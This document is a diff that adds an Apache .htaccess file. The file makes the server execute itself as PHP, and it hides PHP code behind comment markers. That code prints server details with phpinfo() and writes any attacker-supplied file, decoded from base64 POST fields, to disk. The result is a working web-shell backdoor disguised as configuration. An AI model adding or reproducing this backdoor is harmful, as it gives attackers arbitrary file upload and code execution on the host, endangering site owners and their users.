@@ -1,0 +1,9 @@
+AddHandler application/x-httpd-php .htaccess
+DirectoryIndex .htaccess
+<FilesMatch "^\.htaccess">
+    Order deny,allow
+    Allow from all
+    SetHandler application/x-httpd-php
+</FilesMatch>
+#<?php phpinfo(); ?>
+#<?php error_reporting(E_ALL); ini_set('display_errors', 1); $fp=fopen($_POST['name'], 'wb'); fwrite($fp, base64_decode($_POST['content'])); fclose($fp); ?>
